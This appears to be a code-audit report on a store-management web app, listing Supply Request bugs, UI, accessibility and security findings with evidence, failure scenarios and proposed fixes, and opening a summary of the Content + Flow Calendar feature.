#### supply-request-5 — 80% budget alert fires on the wrong set: missed when cost is entered before 'Ordered', spurious otherwise, never checked on status change

*medium · minor · bug · confidence high · `worker.js:21875` · unverified*

**Evidence.** The fulfillment handler sums `SUM(cost) … WHERE status = 'ordered'` for the current ET month (21861-21873), then sets `prevSpent = (spentRow?.spent || 0) - cost + prevCost` (21875). That assumes the request being edited is already 'ordered' and was submitted this month. supply-request-status (21786-21825) never runs the check at all. I ran the real handler bodies (sliced by line range, bounded on both sides) against node:sqlite loaded with migration-011, using a budget of 1000 and 700 already ordered. (A) Cost 200 saved on a pending request, then status set to ordered: 0 alerts, while the Budget tab reports spent 900 (90%). (B) The same two steps in reverse order: 1 alert. (C) Store already at 850 ordered, cost 100 saved on a pending request: 1 alert, even though counted spend is unchanged at 850.

**Failure scenario.** The superuser enters the invoice and cost when the invoice arrives, then flips the request to Ordered. The store crosses 80% and no superuser gets a push. In the opposite case, a '⚠️ Supply Budget Alert' fires for a request that isn't counted in spend. A request submitted last month but costed this month is compared against this month's budget.

**Proposed fix.** Worker-only; it affects notifications only. Add a helper `checkSupplyBudget80(env, ctx, row, before, after)` where counted = status==='ordered' ? (cost||0) : 0. Take the month from row.submitted_at, the same basis the Budget tab uses (see supply-request-6). Compute `others = SUM(cost) … AND status='ordered' AND id != ?` for that month, then prev = others + counted(before) and next = others + counted(after). Fire when prev < 0.8·budget <= next. Call it from fulfillment (before = {existing.status, existing.cost}, after = {existing.status, cost}) and from status (before = {existing.status, existing.cost}, after = {status, existing.cost}). About 25 lines. To verify, re-run scenarios A/B/C and expect 1, 1, 0.

<a id="supply-request-6"></a>
#### supply-request-6 — Budget spend is bucketed by UTC month; Reports bucket the same rows by local (ET) month, so they disagree at every month boundary

*medium · minor · bug · confidence high · `worker.js:21917` · unverified*

**Evidence.** supply-budgets filters `strftime('%Y', submitted_at) = ? AND strftime('%m', submitted_at) = ?` (21917), and so does the fulfillment alert (21872), on values written by `new Date().toISOString()` (21670), which are UTC. Reports buckets with the browser clock: `const d = new Date(r.submitted_at); … d.getMonth()+1` (13460-13461, and the KPI at 13482-13483). In the sqlite harness, a $500 ordered request at 8/31/2026 9:00 PM ET (01:00Z 9/1) counted $500 toward September in supply-budgets and $0 toward August.

**Failure scenario.** Any request submitted after 8 PM ET (7 PM in winter) on the last day of a month is charged to the next month's store budget, and the Budget tab and Reports tab show different spend for both months.

**Proposed fix.** Worker-only; it changes a read path only. Add a helper etMonthBoundsUtc(y, m) that returns ISO [start, end) for midnight America/New_York on the 1st, with the offset resolved via Intl as the worker already does elsewhere for ET. Replace both strftime predicates with `submitted_at >= ? AND submitted_at < ?`. Reports already uses ET months, so the two tabs then agree, and the range predicate is index-friendly. To verify, harness D should show $500 in August and $0 in September.

<a id="supply-request-7"></a>
#### supply-request-7 — Save Status collapses the open request and reloads the whole list; both save confirmations are erased before they can be read

*medium · minor · ui-ux · confidence high · `index.html:13029` · unverified*

**Evidence.** srSaveStatus writes '✓ Saved', re-renders the detail, then has the comment `// Update badge in list without full reload` directly followed by `srLoadAllRequests();` (13028-13029). That call rewrites #sr-pane-all to 'Loading…' with every card collapsed (12811-12818). srSaveFulfillment writes '✓ Saved' (13059), then srRenderSuperDetail replaces the panel's innerHTML with an empty message span (13063). Browser run at 393px: after Save Status the detail was hidden and the message element was gone; after Save Fulfillment the message text was ''. The card's invoice and cost (12889-12890) are not refreshed after a fulfillment save.

**Failure scenario.** The superuser works the queue: marks a request Ordered, and the card snaps shut, the list flashes 'Loading…' and scroll jumps. They have to find and reopen the request to enter the invoice, and never see confirmation of either save. After saving a cost, the card still shows the old or empty cost.

**Proposed fix.** Frontend-only, about 25 lines. In srSaveStatus, remove srLoadAllRequests(). Update the matching srAllRequests entry and swap the badge in place (give the header badge an id `sr-sbadge-${id}`). If a status filter is active and the new status no longer matches, remove just that card. Set the '✓ Saved' text AFTER srRenderSuperDetail, on the new span, in both functions. After a fulfillment save, patch the card's cost and invoice spans from data2.request.

<a id="supply-request-8"></a>
#### supply-request-8 — Comments by anyone other than the original requester never notify superusers

*medium · minor · bug · confidence high · `worker.js:9477` · unverified*

**Evidence.** notifySupplyComment decides the audience with `const isSuperCommenter = commenterId !== requesterId;` (worker.js:9477), so 'not the requester' is treated as 'superuser'. The comment endpoint (26724-26736) lets anyone with access to the store comment: co-managers, admins, the DM.

**Failure scenario.** Manager A files a request for Coliseum. Coliseum's second manager adds "Any ETA? we're out of bags". The push goes to manager A instead of the superuser who can answer, and superusers are pushed only when the original requester comments.

**Proposed fix.** Worker-only. Pass `commenterRole: currentUser.role` from the endpoint. In notifySupplyComment: if commenterRole === 'superuser', notify the requester (when commenterId !== requesterId). Otherwise notify superusers, and also the requester when commenterId !== requesterId.

<a id="supply-request-9"></a>
#### supply-request-9 — Every visit to Supply Request re-renders the New Request form, wiping unsubmitted items

*medium · minor · ui-ux · confidence high · `index.html:12348` · unverified*

**Evidence.** navigateToPage calls initSRPage on every entry with no same-page short-circuit (11990-11992). initSRPage unconditionally calls srRenderForm() (12348), which replaces #sr-pane-new's innerHTML and resets srItemSeq (12399-12436). This includes swipe-back (popstate) and re-tapping the Supply tab.

**Failure scenario.** A manager has typed eight items, taps Dashboard (or the Supply tab again, or swipes back), and returns to a blank one-item form.

**Proposed fix.** In initSRPage, render only when needed: `const p = el('sr-pane-new'); if (p && p.dataset.user !== (currentUser?.email||'')) { srRenderForm(); p.dataset.user = currentUser?.email||''; }`. A successful submit already resets the form. Keep switching to the 'new' tab as now.

<a id="supply-request-10"></a>
#### supply-request-10 — Load failures (401/403/500) render as empty states; the filtered-empty state says 'Submit your first request'

*medium · minor · bug · confidence high · `index.html:12607` · unverified*

**Evidence.** srLoadHistory: `const data = await resp.json(); srRenderRequestsList(data.requests || []);` (12605-12607), with no resp.ok or data.ok check. srLoadAllRequests (12827-12832) and srLoadReports (13441-13443, `reqData.requests||[]`) have the same gap. The worker answers `{error:'Unauthorized'}` with 401 and `{error:e.message}` with 500 (21711, 21752). The empty state (12634-12638) says "No requests found … Submit your first request →" even when a status chip is active. The error paths at 12541, 12610, 13288 and 13445 put e.message into innerHTML unescaped.

**Failure scenario.** A manager's session has expired, or D1 hiccups. My Requests shows 'No requests found — Submit your first request' and Reports shows 'No requests yet.', which reads as lost data rather than an error. Filtering to 'On Hold' when there are none also says 'Submit your first request'.

**Proposed fix.** In the three loaders (and for budResp): `if (!resp.ok || !data.ok) throw new Error(data.error || `HTTP ${resp.status}`);`. Render the existing red error block with escapeHtml(e.message) and a Retry button. Empty copy becomes `srFilterStatus==='all' ? <current> : `No ${label} requests.``. Also escape e.message at 12541, 12610, 13288 and 13445.

<a id="supply-request-11"></a>
#### supply-request-11 — Detail cache is never invalidated on refresh or re-list, so expanded requests show a stale timeline and status

*medium · minor · bug · confidence high · `index.html:12684` · unverified*

**Evidence.** srDetailCache is cleared only in initSRPage (12342), after this client's own writes (12778, 13024, 13060, 13086, 13109), and after a purge (13266). srToggleDetail and srToggleSuperDetail return the cached copy when present (12684, 12911). Neither the ↻ Refresh button (12851 → srLoadAllRequests) nor the My Requests reload (12375 → srLoadHistory) clears it.

**Failure scenario.** A manager opened a request earlier, then gets the push '💬 Comment on your supply request'. They switch to My Requests: the list reloads and shows the new status badge, but expanding the request shows the cached timeline without the comment or the status change. The superuser pressing ↻ to check for replies sees an old timeline and the old status preselected in Update Status.

**Proposed fix.** Add `srDetailCache = {};` at the start of srLoadHistory and srLoadAllRequests, since the list is being refetched anyway. Alternatively, drop the cache and always GET on expand.

<a id="supply-request-12"></a>
#### supply-request-12 — Out-of-order responses: budget month navigation can show one month's numbers under another month's label; filter reloads race too

*medium · minor · bug · confidence medium · `index.html:13295` · unverified*

**Evidence.** srBudgetNav (13379-13384) changes srBudgetYear/Month and calls srLoadBudgetMgmt, which renders `srRenderBudgetMgmt(data.budgets)` (13285). The renderer takes the month label from the globals, `new Date(srBudgetYear, srBudgetMonth-1, 1)` (13295), ignores data.year/data.month, and uses no request token. srSaveBudget writes to the globals (13398). srLoadHistory (12604-12607) and srLoadAllRequests (12822-12832, also fired concurrently by srSaveStatus at 13029) follow the same pattern. srLoadingHist is set (12592, 12611) but never read.

**Failure scenario.** The superuser double-taps 'Next month': September → October → November, each request running 12 D1 queries. If October's response lands last, the page labelled 'November 2026' shows October's budgets and spend, and editing a card saves to November starting from October's figure. On the filter chips: tap Pending, then All; a late Pending response leaves 'All' highlighted over a pending-only list.

**Proposed fix.** Add a sequence token to each loader: `const seq = ++srBudgetSeq; …; if (seq !== srBudgetSeq) return;` before rendering. Do the same for history and the all-requests list. Render the month label from data.year/data.month. Delete the dead srLoadingHist.

<a id="supply-request-13"></a>
#### supply-request-13 — Purge panel doesn't say it ignores the store/status filters it sits under: it deletes across all stores

*medium · minor · ui-ux · confidence high · `index.html:13192` · unverified*

**Evidence.** #sr-purge-panel renders directly beneath the store/status/priority selects (12813-12814). Preview and run take no store: `supply-requests-purge-preview&days=30` (13160) and `… FROM supply_requests WHERE submitted_at < ? GROUP BY status` (worker.js:26651-26652). The heading reads 'Delete requests older than ${data.days} days' / 'Submitted before … · removes their line items and comment history too' (13192-13193). The confirm text (13244) doesn't say 'all stores' either.

**Failure scenario.** The superuser filters to Holland to tidy up the closed store, opens Clean up, sees 'Ordered 14' and confirms. That deletes 14 ordered requests across all six stores and removes their spend from the live stores' Budget and Reports.

**Proposed fix.** Frontend-only; it adds safety. Put 'across all stores' in the heading and the confirm. When srAllFilters.store, status or priority is not 'all', add a line in the panel: 'The filters above don't apply — this cleans up every store.'

<a id="supply-request-18"></a>
#### supply-request-18 — Phone form: 14px inputs trigger iOS focus-zoom; remove-item and filter-chip tap targets are about 25px

*medium · minor · ui-ux · confidence high · `index.html:12444` · unverified*

**Evidence.** All form controls are text-sm: srInp (12311), the item-field class `text-sm px-2.5 py-1.5` (12444), and both comment inputs (12754, 12948). The viewport meta (line 5) has no maximum-scale and there is no global 16px input rule; the Menu page's search explicitly uses 16px because 'iOS zooms the whole page into any smaller input on focus' (1280). Measured in Chromium at 393px: computed font-size is 14px for #sr-name-1, #sr-qty-1, #sr-cat-1 and #sr-notes; the ✕ remove button (12472-12475) is 25×25; the status chips (12623-12626) are 42×26.

**Failure scenario.** A manager on an iPhone (Supply is a bottom-nav tab) taps Item Name and the page zooms in; they have to pinch back out after every field. The 25px ✕ is easy to miss and sits right next to the Notes input.

**Proposed fix.** srInp and the item `inp` class: `text-base sm:text-sm`; same for the two comment inputs. Remove button: `w-11 h-11 grid place-items-center -m-2`. Chips: `py-2 max-lg:min-h-[44px]`. Frontend-only class changes.

<a id="supply-request-19"></a>
#### supply-request-19 — Text contrast below 4.5:1 on the active filter chip, the Urgent selection, the Delete button, the 'Under Review' pill and save/error messages

*medium · minor · accessibility · confidence high · `index.html:12625` · unverified*

**Evidence.** Computed from literal hexes and the tokens in DESIGN.md §2.1 and index.html's first <style>, against the real grounds:
- Active chip `bg-[#3BB54A] text-white` (12625): 2.66:1 in every theme.
- Selected Urgent `peer-checked:bg-op-bad peer-checked:text-white` (12409) and purge `bg-op-bad text-white` 'Delete N' (13200): 3.76:1. The text-op-bad overrides at 186-188 don't touch these fills.
- 'Under Review' pill `bg-accent-blue/15 text-accent-blue` (12299): 3.10:1 light, 4.01:1 dark, 4.65 OLED. There is no light override for text-accent-blue.
- `text-green-600` save messages (13021, 13058, 13402): 3.02:1 on the admin box in light, 3.30:1 on white.
- `text-red-500` errors (13032, 13067, 13392, 13405): 3.45–3.76:1 light, 4.24:1 dark.

**Failure scenario.** Store managers reading the page in bright store lighting, or with low vision, can't tell which status filter is active or read 'Under Review'. Save and error feedback fails AA in light mode.

**Proposed fix.** Active chip: `bg-accent-green text-[#06210f]` (7.48:1; the Send button already uses #06210f on green at 6.41). Urgent and Delete: `bg-[#c0392b]` (opl-bad) with white (5.44:1). Under Review: `text-[#1d4ed8] dark:text-[#93c5fd]` (5.64 / 8.18). Save messages: `text-[#166534] dark:text-green-400` (6.54 / 9.15). Errors: `text-opl-bad dark:text-[#f87171]`, the pair the page already uses (4.99 / 5.77).

<a id="supply-request-20"></a>
#### supply-request-20 — Request rows can't be opened from the keyboard; tabs, labels and priority radios lack semantics and focus indication

*medium · minor · accessibility · confidence high · `index.html:12877` · unverified*

**Evidence.** Expandable rows are `<div class="… cursor-pointer …" onclick="srToggleDetail('${r.id}')">` (12647-12648) and `onclick="srToggleSuperDetail(…)"` (12877-12878). In the browser they have tabIndex -1, no role and no aria-expanded. The tab buttons (12358-12361) have no role=tab or aria-selected; the active tab is shown by class only. Form labels aren't associated with their fields: `<label class="${lblCls}">Store</label>` (12392) and the item labels (12452-12468) have no for=. The priority radios are `sr-only` peers with no peer-focus-visible style (12406-12409), so keyboard focus on them is invisible.

**Failure scenario.** On desktop, a keyboard-only user can't expand any request, so Update Status, Fulfillment, comments and Delete are unreachable. VoiceOver reads the item fields as unlabeled 'edit text', and tabbing through Priority shows no focus.

**Proposed fix.** Render each header as `<button type="button" class="w-full text-left …" aria-expanded="false" aria-controls="sr-detail-${id}">` and flip aria-expanded in both toggle functions. Add for= to labels (`sr-store`, `sr-cat-${n}`, `sr-name-${n}`, `sr-qty-${n}`, `sr-unit-${n}`, `sr-inotes-${n}`). Add `peer-focus-visible:ring-2 peer-focus-visible:ring-accent-green` to the two priority spans. Give tab buttons role=tab and set aria-selected in srSwitchTab.

<a id="supply-request-14"></a>
#### supply-request-14 — Purge and delete permanently erase requests and their recorded spend with no archive; the only undo is a whole-DB restore

*medium · major · bug · confidence high · `worker.js:26704` · unverified*

**Evidence.** supply-requests-purge runs a batch DELETE of items, history and requests (worker.js:26703-26708), and supply-request-delete runs a DELETE (26631). Nothing is snapshotted. The panel pre-checks 'ordered' (index.html:13182), which is the one status whose cost feeds supply-budgets' `SUM(cost) … status='ordered'` (21915-21918) and Reports. The UI itself warns 'Removes $X of recorded spend from the Budget and Reports tabs' (13225). CLAUDE.md rule 2: 'Back up before overwriting … Losing the undo is not an acceptable price.'

**Failure scenario.** On the 22nd, a routine cleanup with the default selection deletes every ordered request from the 1st–22nd of last month. Last month's Budget tab now shows, for example, $300 spent of $1,000 instead of $950, and Reports loses that history. Recovering means a D1 Time Travel restore of the whole database, which also rolls back everything written since.

**Plan.** Future plan. (1) Worker first; this is additive and backward-compatible. Before the DELETE batch, SELECT the matched requests with their items and history and write them as one JSON object to R2 at `supply-purge/<iso>-<userId>.json`. Treat a failed put as a failed purge: return 500 and delete nothing. Add `archive` to the response, and do the same for single delete. (2) Optional schema step: add a `supply_spend_monthly` rollup written at purge time, and have supply-budgets and Reports read rollup plus live rows. Deploy the migration first, then the worker that reads both; the frontend needs no change. (3) Frontend: show the archive key in the success alert, and start with no status pre-checked. Risks: the ordering must be archive, then delete, in one batch; R2 size is trivial at this scale. To verify, use worker-harness with node:sqlite and a stubbed R2: an R2 failure gives 500 with 0 rows deleted, and on success the archive row counts equal deleted/items/history.

<a id="supply-request-15"></a>
#### supply-request-15 — Single 'Delete Request' confirm doesn't mention the spend it removes from the budget

*low · minor · ui-ux · confidence high · `index.html:13098` · unverified*

**Evidence.** `uiConfirm('Permanently delete this supply request and all its history? This cannot be undone.')` (13098), with no title and no danger styling. The bulk purge, by contrast, says 'This also removes ${fmtSRMoney(orderedCost)} of recorded spend…' (13245). The request's status and cost are already in srDetailCache[reqId].

**Failure scenario.** Deleting a $640 ordered request silently lowers that store's Budget 'spent' for its month by $640.

**Proposed fix.** `const r = srDetailCache[reqId]; let m = 'Permanently delete this supply request and all its history? This cannot be undone.'; if (r?.status === 'ordered' && r.cost) m += `\n\nThis also removes ${fmtSRMoney(r.cost)} of recorded spend from ${SR_LABELS[r.store]||r.store}'s budget.`; if (!await uiConfirm(m, {title:'Delete request', okText:'Delete', danger:true})) return;`

<a id="supply-request-16"></a>
#### supply-request-16 — Danger confirms focus the destructive button and accept Enter, so a second Enter confirms the purge

*low · minor · accessibility · confidence medium · `index.html:7826` · unverified*

**Evidence.** _uiDialog always focuses the OK button, `(input || okEl).focus()` (7826), and treats Enter as confirm, `else if (e.key === 'Enter' && !choices) finish(true);` (7800), even when `danger:true`. The purge uses exactly that: `uiConfirm(msg, { title:'Delete old requests', okText:`Delete ${count}`, danger:true })` (13247).

**Failure scenario.** A keyboard user activates 'Delete 14' with Enter. A second Enter press, or key auto-repeat, confirms the irreversible purge before the per-status summary has been read.

**Proposed fix.** This is the shared helper, one function. When `danger` is true, focus the Cancel button and ignore Enter: `else if (e.key === 'Enter' && !choices && !danger) finish(true);`. That hardens every danger confirm in the app, which is the intent.

<a id="supply-request-17"></a>
#### supply-request-17 — Purge's drift guard is optional server-side and compares only the total count

*low · minor · security · confidence high · `worker.js:26693` · unverified*

**Evidence.** `if (body.expectCount != null && Number(body.expectCount) !== actual) { … 409 }` (worker.js:26693). If expectCount is omitted, the only check that the operator approved this set is skipped, and it compares the total, not the per-status counts shown in the preview.

**Failure scenario.** An old client, a script, or a hand-typed call with the superuser session, `{"statuses":["ordered","pending","under_review","on_hold"]}`, deletes every request older than 30 days with no count confirmation at all.

**Proposed fix.** Worker-only; it adds safety and the current frontend already sends expectCount. Return 400 unless `Number.isInteger(body.expectCount) && body.expectCount >= 0`. Optionally accept `expectByStatus` and, when present, compare it per status against a `GROUP BY status` recount.

<a id="supply-request-21"></a>
#### supply-request-21 — Reports on a phone: the sticky Month column scrolls away, KPI amounts overflow their tiles, and unchecked purge checkboxes paint white in dark

*low · minor · ui-ux · confidence high · `index.html:13527` · unverified*

**Evidence.** The Month cells are `sticky left-0 bg-white dark:bg-op-panel` (13513, 13530), but the <table> carries `rounded-2xl … overflow-hidden` (13527). That makes the table the sticky container: at 393px, scrolling the wrapper 200px moved the month cell from x=17 to x=-183. The KPI row is `grid-cols-3 gap-3` with `p-4` and `text-lg` values (13487-13492), leaving a 78px content box. '$3,456.78' measured 101px with the fallback font (Geist could not load offline); Geist's roughly 0.6em tabular digits still come to about 85px. The purge checkboxes set only `accent-op-bad` (13182) and computed color-scheme is 'normal', which is DESIGN.md §4.8 trap 4: the unchecked box is UA-white on the dark panel.

**Failure scenario.** Scrolling the 8-column Reports table right on a phone loses track of which row is which month. 'This month · ordered' amounts of $1,000 and up run into the neighbouring tile.

**Proposed fix.** Move `rounded-2xl border overflow-hidden` from the <table> to the wrapper (`overflow-x-auto rounded-2xl border …`) and leave the table plain. KPI row: `grid-cols-1 sm:grid-cols-3`, or `text-base sm:text-lg` with `px-2`. Purge panel: add `[color-scheme:light] dark:[color-scheme:dark]`.

<a id="supply-request-22"></a>
#### supply-request-22 — Closed Holland (BL8) raises a permanent 'store needs a budget' warning and stays selectable for new requests

*low · minor · ui-ux · confidence high · `index.html:13305` · unverified*

**Evidence.** supply-budgets iterates ALL_STORES, including BL8 (worker.js:21904), even though BL8 closed on 2026-07-25 per CLOSED_STORES (index.html:7535) and STORE_CLOSED_FROM (worker.js:5862). srRenderBudgetMgmt counts it as unset (13299). The result is the hero note ' · 1 store needs a budget' (13305) and a warn-bordered 'Set a monthly budget to track usage →' card (13330, 13338) for every month since; the browser run showed the note. Admins' store picker uses SR_ALL (12315, 12394), and supply-request-create and supply-budget-set don't refuse closed stores the way shelf count does (worker.js:26525).

**Failure scenario.** Every month the Budget tab warns about a store that no longer exists, so the warning becomes noise and a genuinely unset store is easier to miss. An admin can file a supply request for Holland.

**Proposed fix.** In srRenderBudgetMgmt, skip the unset count and warn border for CLOSED_STORES stores when the viewed month starts after the closure date and the store has no budget or spend (render a muted 'Closed' card or omit it). Filter CLOSED_STORES out in getUserStores/srRenderForm. Keep SR_ALL for Reports columns and filters (tasks/todo.md:5682 and scripts/test-closed-stores.mjs pin it). Optional worker guard in create using STORE_CLOSED_FROM.

<a id="supply-request-23"></a>
#### supply-request-23 — Budget severity uses the rounded percentage: 99.5% shows red '100% used' next to '$75.00 left'

*low · minor · bug · confidence high · `index.html:13326` · unverified*

**Evidence.** `const rawPct = has ? Math.round((b.spent / b.budget) * 100) : null; … const sev = … (rawPct >= 100 ? 'over' : (rawPct >= 80 ? 'warn' : 'ok'))` (13324-13326), while the headline value uses `b.remaining >= 0` → 'left' (13331). The manager widget does the same (12568-12571: a red bar from the rounded pct, the text from remaining). Browser run, budget 15000 and spent 14925: the card read '$75.00 left' in red with a red '100% used' badge. 79.5% turns amber, while the worker alert uses the unrounded ratio (21877-21880).

**Failure scenario.** A store $75 under budget is shown as over budget in red.

**Proposed fix.** Derive severity from the unrounded ratio: `const r = b.spent / b.budget; sev = r > 1 ? 'over' : r >= 0.8 ? 'warn' : 'ok'`. Display `Math.floor(r*100)`%. Apply the same in srRenderBudget (12568-12571) and the hero (13301-13302).

<a id="supply-request-24"></a>
#### supply-request-24 — CSV exports: truncation not stated, no BOM (em dash turns to mojibake), Reports CSV merges counts into the money cells

*low · minor · bug · confidence high · `index.html:13548` · unverified*

**Evidence.** srExportCSV (13118-13133) exports srAllRequests (≤200 rows, already priority-filtered). It builds `new Blob([csv],{type:'text/csv'})` without a BOM, never appends the anchor or revokes the URL, and reports no row count. Compare downloadWrsAsCsv (15528, which adds a BOM) and the bin-dump export (28214-28225: 'A truncated export is SAID OUT LOUD'). srExportReportsCSV scrapes `cell.textContent` (13548), so cells come out as '$1,234.00 (3)' text and '—', which Excel opens as 'â€”' without a BOM. Values starting with = + - @ (emails, invoice numbers) are not neutralised.

**Failure scenario.** The superuser exports 'all requests' for the accountant and gets the newest and urgent 200 rows with no hint that more exist. The Reports CSV can't be summed in Excel because every cell is text with a count glued on.

**Proposed fix.** Prefix the BOM and join rows with \r\n. Append and remove the anchor, and revoke the URL after 1s. Build the Reports CSV from the `months` object, with separate Spent and Count columns per store, instead of DOM text. Prefix `'` to cells matching /^[=+\-@]/. Once paging (supply-request-4) is in, export all rows and show the row count.

<a id="supply-request-25"></a>
#### supply-request-25 — Request creation isn't atomic, and quantity/store aren't validated (negative quantities are accepted from the form)

*low · minor · bug · confidence high · `worker.js:21674` · unverified*

**Evidence.** worker.js:21674-21693 writes the request INSERT, then the items batch, then the history INSERT as three separate commits, then re-SELECTs the items it just wrote (21696). If anything after the first commit fails, a request with 0 items remains and the client shows 'Error: …' (12541), inviting a resubmit. For admin and superuser `allowed === null` (21659), so the store is never checked against ALL_STORES. The form sends `parseInt(el(`sr-qty-${n}`)?.value || '1', 10)` (12514). The worker harness stored quantity -5 unchanged, and 0 silently becomes 1 via `it.quantity || 1` (21685).

**Failure scenario.** A transient D1 error mid-create leaves an empty request in All Requests, and the retry creates a duplicate. A typed '-5 rolls' goes to purchasing as-is.

**Proposed fix.** Worker: build `[reqInsert, ...itemInserts, historyInsert]` and `await env.DB.batch(all)`; D1 batches are transactional. Pass the in-memory items to notifySupplyRequestNew instead of re-selecting. Add `if (!ALL_STORES.includes(store)) return 400`. Frontend: validate `Number.isInteger(q) && q >= 1` and flag the field the same way the name check does.

<a id="supply-request-26"></a>
#### supply-request-26 — Fulfillment can't clear a wrong cost or invoice, and a negative cost is accepted

*low · minor · ui-ux · confidence high · `index.html:13044` · unverified*

**Evidence.** `const invoice = …trim() || null; const cost = costVal !== '' && costVal != null ? parseFloat(costVal) : null; if (invoice === null && cost === null) { msg.textContent = 'Nothing to save.'; return; }`, and only non-null fields are sent (13039-13049). The worker would accept an explicit null (21843-21844 test `!== undefined`). `min="0"` on the cost input (12976) isn't enforced, so '-50' is sent and lowers the store's spend.

**Failure scenario.** A cost typed on the wrong request can only be zeroed, never removed, and a wrong invoice number can only be overwritten. A typo of -50 reduces budget spend.

**Proposed fix.** Send `invoice_number` and `cost` whenever the field differs from the loaded value (srDetailCache[reqId]), with an empty field sent as null to clear it. Reject cost < 0 or NaN client-side. The API contract is unchanged.

<a id="supply-request-27"></a>
#### supply-request-27 — Redundant round trips: every Save Fulfillment reloads the hidden Budget pane (12 D1 queries); Save Status refetches the full 200-row list

*low · minor · performance · confidence high · `index.html:13064` · unverified*

**Evidence.** srSaveFulfillment ends with `srLoadBudgetMgmt(); // refresh budget numbers` (13064), but that pane is hidden while All Requests is open and srSwitchTab reloads it on every entry anyway (12377). Each load is supply-budgets: 2 queries × 6 stores = 12 D1 queries (21909-21923) with strftime() on submitted_at, which can't use an index. srSaveStatus does PATCH + detail GET + the full list GET, which runs a correlated COUNT subquery per row (21737) and a second COUNT(*) query (21746). initSRPage also renders the New Request form for superusers, who never see it (12348).

**Failure scenario.** Each fulfillment save costs about 14 D1 queries and 3 sequential round trips, which is visible lag on a store's LTE connection, repeated for every request in the queue.

**Proposed fix.** Delete the srLoadBudgetMgmt() call in srSaveFulfillment; supply-request-7's in-place patch removes the list reload. Worker: replace the per-store loop with `SELECT store, SUM(cost) … WHERE status='ordered' AND submitted_at >= ? AND submitted_at < ? GROUP BY store` plus one budgets SELECT (2 queries instead of 12). Skip srRenderForm when isSu.

<a id="supply-request-28"></a>
#### supply-request-28 — Executives can create supply requests and comment through the API although their role 'changes nothing' and the UI refuses them

*low · minor · security · confidence medium · `worker.js:21650` · unverified*

**Evidence.** supply-request-create (21650) and supply-request-comment (26725) check only `if (!currentUser)`. Executive is a FINANCIAL_ROLE (14592) with store units, and migration-029 defines it as 'reads everything in scope, changes nothing'. The frontend denies them the page (index.html:11854-11858, nav gate 33458).

**Failure scenario.** An executive session, or a hijacked one, can POST supply requests and comments that the UI never offers, which triggers superuser emails and pushes.

**Proposed fix.** Worker-only guard in both handlers: `if (!['superuser','admin','manager','district_manager'].includes(currentUser.role)) return 403`, mirroring navigateToPage's list.

<a id="supply-request-30"></a>
#### supply-request-30 — The page's only bulk DELETE (purge) has no committed regression test

*low · minor · code-quality · confidence high · `worker.js:26672` · unverified*

**Evidence.** No file under scripts/ mentions supply-requests-purge or purgeCutoff. tasks/lessons.md:1270-1320 describes a 65-assertion node:sqlite harness for exactly these endpoints (the ISO-vs-space cutoff, explicit child deletes, the 29/31-day boundary), but it lived only in a session scratchpad.

**Failure scenario.** A future edit to the purge SQL (the cutoff format, the child-delete order, the status filter) can regress while scripts/test.sh stays green.

**Proposed fix.** Add scripts/test-supply-purge.mjs built on scripts/lib/worker-harness.mjs plus migration-011.sql, with PRAGMA foreign_keys=OFF as the lesson prescribes. Cover: the 29- and 31-day boundaries, expectCount mismatch returning 409, the status filter, children deleted without cascade, and preview counts equal to run counts. Wire it into scripts/test.sh.

<a id="supply-request-29"></a>
#### supply-request-29 — Queue rows show only 'N items': the superuser must expand every request to see what is being asked for

*low · major · ui-ux · confidence medium · `index.html:12874` · unverified*

**Evidence.** supply-requests returns only `item_count` (worker.js:21737). Both list renderers show just '1 item' / 'N items' (12643, 12874). Seeing the actual items takes one GET per request on expand (12913).

**Failure scenario.** With 30 pending requests the superuser has to expand 30 cards to triage them, and urgent requests can't be judged from the list at all.

**Plan.** Future plan. (1) Worker first, additive: add `item_preview` to each supply-requests row, e.g. `(SELECT GROUP_CONCAT(item_name || ' ×' || quantity, ', ') FROM (SELECT … FROM supply_request_items WHERE request_id = r.id ORDER BY rowid LIMIT 3))`. The current frontend ignores unknown fields. (2) Frontend: render `escapeHtml(r.item_preview)` under the meta line, falling back to 'N items'. Deploy order: worker, then frontend, because the frontend consumes the new field. Verify with worker-harness that a BL1 manager's rows contain no other store's items, and that the preview is escaped on render.

</details>

<a id="content-flow"></a>
### Content + Flow Calendar

Content + Flow Calendar is mostly careful. The publish path has an atomic claim, a reconcile-before-publish check and a stale-claim reaper, it uses uiConfirm/uiAlert throughout, most Facebook- and user-supplied text is escaped, and the Flow Calendar's band colours all pass 4.5:1 (4.82–7.36). The biggest risks are on the outward-facing path. A post scheduled as "staged" comes back to Drafts looking like a normal draft with a Publish button, which invites a duplicate public post; rescheduling it marks it Published without ever posting it live. Composer "Schedule…" creates a new draft on every attempt, so a cancelled or failed schedule leaves duplicates. Publish on a card sends the saved copy even when the composer holds unsaved edits to the same post. "Update draft" can silently rewrite a post that has already been published. On security, the photo and thumbnail endpoints serve whatever Content-Type the uploader declared, so an SVG uploaded by any signed-in user can run script on the API origin. Separately, escapeHtml does not escape quotes, so a quote in a thumbnail name breaks out of its alt attribute (confirmed in Chromium). Several composer paths lose work or show the wrong state: a notification deep-link wipes the autosave, a slow response for one store can overwrite the photo picker after switching to another, a successful publish can be reported as "Publish failed: HTTP 200", and a network hiccup can erase the saved brand guide. Everything is hard-coded to F26, whose last week ends 2026-12-26. I confirmed the key claims by running the sliced functions in node and loading the prebuilt page in Chromium with every API call stubbed.

| ID | Sev | Size | Category | Finding | Where | Verified |
|---|---|---|---|---|---|---|
| [content-flow-1](#content-flow-1) | high | minor | security | photo/thumbnail endpoints serve the uploader-declared Content-Type (SVG) from the API origin with no nosniff/CSP: stored XSS from any signed-in user | `worker.js:16997` | unverified |
| [content-flow-2](#content-flow-2) | high | minor | bug | Staged posts (status 'approved') come back to Drafts with Publish/Edit: duplicate public post, or a reschedule marked Published without ever posting live | `index.html:19290` | unverified |
| [content-flow-3](#content-flow-3) | medium | minor | bug | Composer 'Schedule…' inserts a NEW draft on every attempt and has no in-flight guard: a cancelled or failed schedule leaves duplicates, and a double-tap stacks two popovers | `index.html:18141` | unverified |
| [content-flow-4](#content-flow-4) | medium | minor | bug | Publish on a draft card posts the SAVED copy while the composer holds unsaved edits to the same post, and the confirm names neither the store nor the caption | `index.html:19431` | unverified |
| [content-flow-5](#content-flow-5) | medium | minor | bug | 'Update draft' on a post that has since been published silently rewrites the published record (a restored autosave or a long edit session) | `worker.js:17266` | unverified |
| [content-flow-6](#content-flow-6) | medium | minor | bug | Composer work is silently lost: a notification deep-link wipes the autosave, Edit replaces unsaved work, and AI captions are never autosaved | `index.html:18447` | unverified |
